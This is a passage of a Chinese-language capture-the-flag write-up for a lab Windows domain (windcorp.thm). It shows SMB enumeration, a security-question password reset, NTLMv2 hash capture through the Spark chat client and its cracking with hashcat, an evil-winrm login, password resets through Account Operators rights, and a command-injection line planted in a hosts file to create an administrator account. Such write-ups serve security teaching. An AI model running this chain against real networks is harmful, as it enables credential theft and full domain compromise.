class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Emily Jensen<br>Lily Levesque<br>Kirk Uglas<br></code></pre></td></tr></table></figure><p>或许目标内部员工有把对应图像文件名当成用户名的习惯，所以其图像名称获取能为真正用户名猜想做一些参考。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://windcorp.thm/img/Emilieje.jpg<br>http://windcorp.thm/img/lilyleAndSparky.jpg<br>http://windcorp.thm/img/kirkug.jpg<br></code></pre></td></tr></table></figure><p>Lily Levesque的文件中有一个And链接了另一个名称Sparky。谁是Sparky，抱的这只宠物狗？</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708150128234.png" alt="image-20220708150128234"></p><p>在右上角重置密码中，能看到其中一个问题是最喜欢的宠物，输入后会重置密码为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ChangeMe<span class="hljs-meta">#1234</span><br></code></pre></td></tr></table></figure><p>并提醒记得登录后修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> TIP=10.10.121.103<br>$ smbmap -H <span class="hljs-variable">$TIP</span> -u lilyle -p ChangeMe<span class="hljs-comment">#1234</span><br>[+] IP: 10.10.121.103:445Name: windcorp.thm                                      <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>Shared                                            READ ONLY<br>SYSVOL                                            READ ONLYLogon server share <br>Users                                             READ ONLY<br></code></pre></td></tr></table></figure><p>Users中会有很多用户名，可以被用来制作用户名字典。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //<span class="hljs-variable">$TIP</span>/Users -U lilyle -c <span class="hljs-built_in">ls</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user<br>$ <span class="hljs-built_in">cat</span> user<br>Administrator<br>angrybird<br>berg<br>bluefrog579<br>brittanycr<br>brownostrich284<br>buse<br>edward<br>freddy<br>garys<br>goldencat416<br>goldenwol<br>happ<br>happyme<br>Luis<br>orga<br>organicf<br>organicfish718<br>pete<br>Public<br>purplecat<br>purplepanda<br>sadswan<br>sadswan869<br>sheela<br>silver<br>smallf<br>spiff<br>tinygoos<br>whiteleopard<br></code></pre></td></tr></table></figure><p>接着看另一个共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //<span class="hljs-variable">$TIP</span>/Shared -U lilyle<br>Enter WORKGROUP\lilyle<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Sat May 30 08:45:42 2020</span><br><span class="hljs-string">  ..                                  D        0  Sat May 30 08:45:42 2020</span><br><span class="hljs-string">  Flag 1.txt                          A       45  Fri May  1 23:32:36 2020</span><br><span class="hljs-string">  spark_2_8_3.deb                     A 29526628  Sat May 30 08:45:01 2020</span><br><span class="hljs-string">  spark_2_8_3.dmg                     A 99555201  Sun May  3 19:06:58 2020</span><br><span class="hljs-string">  spark_2_8_3.exe                     A 78765568  Sun May  3 19:05:56 2020</span><br><span class="hljs-string">  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 19:07:24 2020</span><br></code></pre></td></tr></table></figure><h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><p>spark是一个通信软件，该2.8.3被允许以类似HTLM外链图片的方式与聊天对象发送消息，配合responder可利用强制认证捕获到目标的NTLMv2哈希。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Listening <span class="hljs-keyword">for</span> events...<br><br>[HTTP] NTLMv2 Client   : 10.10.121.103<br>[HTTP] NTLMv2 Username : WINDCORP\buse<br>[HTTP] NTLMv2 Hash     : buse::WINDCORP:6da1ec088e2f0ad5:C28F54DAB3F6B4C463F0D569BF59EC7E:0101000000000000D8858F47AF1CD801A099D85D31F3B105000000000200080042004A005900390001001E00570049004E002D0056005600580057003800380032003200530050004A000400140042004A00590039002E004C004F00430041004C0003003400570049004E002D0056005600580057003800380032003200530050004A002E0042004A00590039002E004C004F00430041004C000500140042004A00590039002E004C004F00430041004C000800300030000000000000000100000000200000DEAFDEAC9E1ACD2053A729447BC2415EBAF161709AD5EC89915C6DBE11D0B9DD0A00100000000000000000000000000000000000090000000000000000000000<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br>BUSE::WINDCORP:6da1ec088e2f0ad5:c28f54dab3f6b4c463f0d569bf59ec7e:0101000000000000d8858f47af1cd801a099d85d31f3b105000000000200080042004a005900390001001e00570049004e002d0056005600580057003800380032003200530050004a000400140042004a00590039002e004c004f00430041004c0003003400570049004e002d0056005600580057003800380032003200530050004a002e0042004a00590039002e004c004f00430041004c000500140042004a00590039002e004c004f00430041004c000800300030000000000000000100000000200000deafdeac9e1acd2053a729447bc2415ebaf161709ad5ec89915c6dbe11d0b9dd0a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">buse</span>:uzunLM+<span class="hljs-number">3131</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb <span class="hljs-variable">$TIP</span>  -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br>SMB         10.10.121.103   445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)<br>SMB         10.10.121.103   445    FIRE             [+] windcorp.thm\buse:uzunLM+3131<br>$ smbmap -H <span class="hljs-variable">$TIP</span> -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br>[+] IP: 10.10.121.103:445Name: windcorp.thm                                      <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>Shared                                            READ ONLY<br>SYSVOL                                            READ ONLYLogon server share <br>Users                                             READ ONLY<br>$ crackmapexec winrm <span class="hljs-variable">$TIP</span>  -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br>WINRM       10.10.121.103   5985   FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm)<br>WINRM       10.10.121.103   5985   FIRE             [*] http://10.10.121.103:5985/wsman<br>WINRM       10.10.121.103   5985   FIRE             [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i <span class="hljs-variable">$TIP</span> -u buse -p <span class="hljs-string">&#x27;uzunLM+3131&#x27;</span><br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\buse\Documents&gt; <span class="hljs-built_in">cd</span> ../Desktop<br>*Evil-WinRM* PS C:\Users\buse\Desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\buse\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----         5/7/2020   3:00 AM                Also stuff<br>d-----         5/7/2020   2:58 AM                Stuff<br>-a----         5/2/2020  11:53 AM             45 Flag 2.txt<br>-a----         5/1/2020   8:33 AM             37 Notes.txt<br><br><br>*Evil-WinRM* PS C:\Users\buse\Desktop&gt; <span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;Flag 2.txt&quot;</span><br></code></pre></td></tr></table></figure><h6 id="Flag3-txt"><a href="#Flag3-txt" class="headerlink" title="Flag3.txt:"></a>Flag3.txt:</h6><p>在C:\script目录下有一个checkserver.ps1脚本。相对的还有一个log.txt用以记录该脚本上一次运行的时间：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; <span class="hljs-built_in">cat</span> log.txt<br>Last run: <span class="hljs-number">07</span>/<span class="hljs-number">08</span>/<span class="hljs-number">2022</span> <span class="hljs-number">01</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; <span class="hljs-built_in">cat</span> checkservers.ps1<br><span class="hljs-comment"># reset the lists of hosts prior to looping</span><br><span class="hljs-variable">$OutageHosts</span> = <span class="hljs-variable">$Null</span><br><span class="hljs-comment"># specify the time you want email notifications resent for hosts that are down</span><br><span class="hljs-variable">$EmailTimeOut</span> = <span class="hljs-number">30</span><br><span class="hljs-comment"># specify the time you want to cycle through your host lists.</span><br><span class="hljs-variable">$SleepTimeOut</span> = <span class="hljs-number">45</span><br><span class="hljs-comment"># specify the maximum hosts that can be down before the script is aborted</span><br><span class="hljs-variable">$MaxOutageCount</span> = <span class="hljs-number">10</span><br><span class="hljs-comment"># specify who gets notified</span><br><span class="hljs-variable">$notificationto</span> = <span class="hljs-string">&quot;brittanycr@windcorp.thm&quot;</span><br><span class="hljs-comment"># specify where the notifications come from</span><br><span class="hljs-variable">$notificationfrom</span> = <span class="hljs-string">&quot;admin@windcorp.thm&quot;</span><br><span class="hljs-comment"># specify the SMTP server</span><br><span class="hljs-variable">$smtpserver</span> = <span class="hljs-string">&quot;relay.windcorp.thm&quot;</span><br><br><span class="hljs-comment"># start looping here</span><br><span class="hljs-keyword">Do</span>&#123;<br><span class="hljs-variable">$available</span> = <span class="hljs-variable">$Null</span><br><span class="hljs-variable">$notavailable</span> = <span class="hljs-variable">$Null</span><br><span class="hljs-built_in">Write-Host</span> (<span class="hljs-built_in">Get-Date</span>)<br><br><span class="hljs-comment"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span><br><span class="hljs-comment"># from the list without touching the script/scheduled task,</span><br><span class="hljs-comment"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span><br><span class="hljs-built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="hljs-built_in">Where-Object</span> &#123;!(<span class="hljs-variable">$_</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;#&quot;</span>)&#125; |<br><span class="hljs-built_in">ForEach-Object</span> &#123;<br>    <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Test-Connection -ComputerName <span class="hljs-variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span><br>    <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-variable">$p</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>)<br>    &#123;<br>     <span class="hljs-comment"># if the Host is available then just write it to the screen</span><br>     <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Available host ---&gt; &quot;</span><span class="hljs-variable">$_</span> <span class="hljs-literal">-BackgroundColor</span> Green <span class="hljs-literal">-ForegroundColor</span> White<br>     [<span class="hljs-built_in">Array</span>]<span class="hljs-variable">$available</span> += <span class="hljs-variable">$_</span><br>    &#125;<br><span class="hljs-keyword">else</span><br>    &#123;<br>     <span class="hljs-comment"># If the host is unavailable, give a warning to screen</span><br>     <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Unavailable host ------------&gt; &quot;</span><span class="hljs-variable">$_</span> <span class="hljs-literal">-BackgroundColor</span> Magenta <span class="hljs-literal">-ForegroundColor</span> White<br>     <span class="hljs-variable">$p</span> = <span class="hljs-built_in">Test-Connection</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-variable">$_</span> <span class="hljs-literal">-Count</span> <span class="hljs-number">1</span> <span class="hljs-literal">-ea</span> silentlycontinue<br>     <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$p</span>))<br>       &#123;<br>        <span class="hljs-comment"># If the host is still unavailable for 4 full pings, write error and send email</span><br>        <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Unavailable host ------------&gt; &quot;</span><span class="hljs-variable">$_</span> <span class="hljs-literal">-BackgroundColor</span> Red <span class="hljs-literal">-ForegroundColor</span> White<br>        [<span class="hljs-built_in">Array</span>]<span class="hljs-variable">$notavailable</span> += <span class="hljs-variable">$_</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$OutageHosts</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$Null</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$OutageHosts</span>.ContainsKey(<span class="hljs-variable">$_</span>))<br>                &#123;<br>                 <span class="hljs-comment"># First time down add to the list and send email</span><br>                 <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> Is not in the OutageHosts list, first time down&quot;</span><br>                 <span class="hljs-variable">$OutageHosts</span>.Add(<span class="hljs-variable">$_</span>,(<span class="hljs-built_in">get-date</span>))<br>                 <span class="hljs-variable">$Now</span> = <span class="hljs-built_in">Get-date</span><br>                 <span class="hljs-variable">$Body</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> has not responded for 5 pings at <span class="hljs-variable">$Now</span>&quot;</span><br>                 <span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-Body</span> <span class="hljs-string">&quot;<span class="hljs-variable">$body</span>&quot;</span> <span class="hljs-literal">-to</span> <span class="hljs-variable">$notificationto</span> <span class="hljs-literal">-from</span> <span class="hljs-variable">$notificationfrom</span> `<br>                  <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host <span class="hljs-variable">$_</span> is down&quot;</span> <span class="hljs-literal">-SmtpServer</span> <span class="hljs-variable">$smtpserver</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment"># If the host is in the list do nothing for 1 hour and then remove from the list.</span><br>                    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> Is in the OutageHosts list&quot;</span><br>                    <span class="hljs-keyword">if</span> (((<span class="hljs-built_in">Get-Date</span>) - <span class="hljs-variable">$OutageHosts</span>.Item(<span class="hljs-variable">$_</span>)).TotalMinutes <span class="hljs-operator">-gt</span> <span class="hljs-variable">$EmailTimeOut</span>)<br>                    &#123;<span class="hljs-variable">$OutageHosts</span>.Remove(<span class="hljs-variable">$_</span>)&#125;<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-comment"># First time down create the list and send email</span><br>                <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Adding <span class="hljs-variable">$_</span> to OutageHosts.&quot;</span><br>                <span class="hljs-variable">$OutageHosts</span> = <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-variable">$_</span>=(<span class="hljs-built_in">get-date</span>)&#125;<br>                <span class="hljs-variable">$Body</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$_</span> has not responded for 5 pings at <span class="hljs-variable">$Now</span>&quot;</span><br>                <span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-Body</span> <span class="hljs-string">&quot;<span class="hljs-variable">$body</span>&quot;</span> <span class="hljs-literal">-to</span> <span class="hljs-variable">$notificationto</span> <span class="hljs-literal">-from</span> <span class="hljs-variable">$notificationfrom</span> `<br>                 <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;Host <span class="hljs-variable">$_</span> is down&quot;</span> <span class="hljs-literal">-SmtpServer</span> <span class="hljs-variable">$smtpserver</span><br>            &#125;<br>       &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment"># Report to screen the details</span><br><span class="hljs-variable">$log</span> = <span class="hljs-string">&quot;Last run: <span class="hljs-variable">$</span>(Get-Date)&quot;</span><br><span class="hljs-built_in">write-host</span> <span class="hljs-variable">$log</span><br><span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> C:\scripts\log.txt <span class="hljs-literal">-Value</span> <span class="hljs-variable">$log</span><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Available count:&quot;</span><span class="hljs-variable">$available</span>.count<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Not available count:&quot;</span><span class="hljs-variable">$notavailable</span>.count<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Not available hosts:&quot;</span><br><span class="hljs-variable">$OutageHosts</span><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Sleeping <span class="hljs-variable">$SleepTimeOut</span> seconds&quot;</span><br><span class="hljs-built_in">sleep</span> <span class="hljs-variable">$SleepTimeOut</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$OutageHosts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-variable">$MaxOutageCount</span>)<br>&#123;<br>    <span class="hljs-comment"># If there are more than a certain number of host down in an hour abort the script.</span><br>    <span class="hljs-variable">$Exit</span> = <span class="hljs-variable">$True</span><br>    <span class="hljs-variable">$body</span> = <span class="hljs-variable">$OutageHosts</span> | <span class="hljs-built_in">Out-String</span><br>    <span class="hljs-built_in">Send-MailMessage</span> <span class="hljs-literal">-Body</span> <span class="hljs-string">&quot;<span class="hljs-variable">$body</span>&quot;</span> <span class="hljs-literal">-to</span> <span class="hljs-variable">$notificationto</span> <span class="hljs-literal">-from</span> <span class="hljs-variable">$notificationfrom</span> `<br>     <span class="hljs-literal">-Subject</span> <span class="hljs-string">&quot;More than <span class="hljs-variable">$MaxOutageCount</span> Hosts down, monitoring aborted&quot;</span> <span class="hljs-literal">-SmtpServer</span> <span class="hljs-variable">$smtpServer</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$Exit</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$True</span>)<br></code></pre></td></tr></table></figure><p>该脚本正在从C:\Users\brittanycr\hosts.txt读取非注释行去执行ping命令，可以进行命令注入。现在就想办法获取brittanycr账户权限即可，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\scripts&gt; whoami /groups<br><br><span class="hljs-built_in">GROUP</span> INFORMATION<br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                                       <span class="hljs-built_in">Type</span>             SID                                          Attributes<br>================================================ ================ ============================================ ==================================================<br>Everyone                                         Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-1-0</span>                                      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Users                                    Alias            S<span class="hljs-literal">-1-5-32-545</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Pre<span class="hljs-literal">-Windows</span> <span class="hljs-number">2000</span> Compatible Access       Alias            S<span class="hljs-literal">-1-5-32-554</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Account Operators                        Alias            S<span class="hljs-literal">-1-5-32-548</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Desktop Users                     Alias            S<span class="hljs-literal">-1-5-32-555</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Management Users                  Alias            S<span class="hljs-literal">-1-5-32-580</span>                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NETWORK                             Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>                                      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Authenticated Users                 Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>                                     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\This Organization                   Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>                                     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>WINDCORP\IT                                      <span class="hljs-built_in">Group</span>            S<span class="hljs-literal">-1-5-21-555431066-3599073733-176599750-5865</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NTLM Authentication                 Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-64-10</span>                                  Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>Mandatory Label\Medium Plus Mandatory Level      Label            S<span class="hljs-literal">-1-16-8448</span><br></code></pre></td></tr></table></figure><p>Account Operators组可以更改域内其他账户的口令密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\buse\Documents&gt; net user brittanycr qwe123<span class="hljs-comment">#@! /domain</span><br>The command completed successfully.<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\buse\Document<br></code></pre></td></tr></table></figure><p>构造hosts：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">;<span class="hljs-built_in">net</span> user crazy qwe123456! /add;<span class="hljs-built_in">net</span> localgroup Administrators crazy /add<br></code></pre></td></tr></table></figure><p>然后用smb共享替换hosts：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> smbclient //<span class="hljs-number">10.10</span>.<span class="hljs-number">248.134</span>/Users <span class="hljs-literal">-U</span> brittanycr<br>Enter WORKGROUP\brittanycr<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string"></span><br><span class="hljs-string">smb: \&gt; cd brittanycr\</span><br><span class="hljs-string">smb: \brittanycr\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Sun May  3 07:36:46 2020</span><br><span class="hljs-string">  ..                                  D        0  Sun May  3 07:36:46 2020</span><br><span class="hljs-string">  hosts.txt                           A       22  Sun May  3 21:44:57 2020</span><br><span class="hljs-string"></span><br><span class="hljs-string">15587583 blocks of size 4096. 10912915 blocks available</span><br><span class="hljs-string">smb: \brittanycr\&gt; put hosts.txt</span><br><span class="hljs-string">hosts.txt does not exist</span><br><span class="hljs-string">smb: \brittanycr\&gt; put hosts.txt</span><br><span class="hljs-string">putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td 